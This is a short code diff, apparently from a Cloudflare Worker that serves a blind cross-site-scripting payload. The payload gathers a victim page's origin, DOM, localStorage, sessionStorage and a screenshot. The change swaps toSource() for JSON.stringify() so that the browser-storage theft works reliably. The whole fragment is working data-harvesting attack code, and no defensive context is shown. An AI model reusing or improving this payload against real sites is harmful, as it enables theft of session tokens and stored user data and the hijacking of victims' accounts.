@@ -223,8 +223,8 @@ async function handleRequest(request, env) {
                 '        try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}\n' +
                 '        try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}\n' +
                 '        collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)\n' +
-                '        try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}\n' +
-                '        try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}\n' +
+                '        try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}\n' +
+                '        try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}\n' +
                 '        try {\n' +
                 '            screenshot().then(function(img) {\n' +
                 '                collected_data["Screenshot"] = img\n' +
